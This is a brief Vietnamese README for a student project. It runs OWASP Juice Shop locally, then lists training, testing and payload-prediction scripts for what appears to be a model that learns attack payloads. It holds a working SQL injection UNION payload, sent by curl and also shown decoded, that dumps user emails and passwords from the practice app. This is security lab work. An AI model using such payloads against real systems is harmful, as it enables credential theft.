# DACN
#Lệnh chạy docker

Bước 1: Chạy docker
docker run --rm -p 3000:3000 bkimminich/juice-shop

http://localhost:3000


curl "http://localhost:3000/rest/products/search?q=a%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20Users--"

" a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users-- "

Bước 2: Chạy lệnh huấn luyện
python main.py --mode train --config config/config_training.ini --save_path results/train_results/mock_model.json

Bước 3: Chạy lệnh kiểm thử
python main.py --mode target --config config/config_target.ini --load_path results/train_results/mock_model.json --save_path results/target_results/target_model.json


python validate_on_mock.py --model results/train_results/mock_model.json --config config/config_training.ini 

python validate_on_mock.py --model results/train_results/mock_model.json --attempts 5

python predict_payload.py 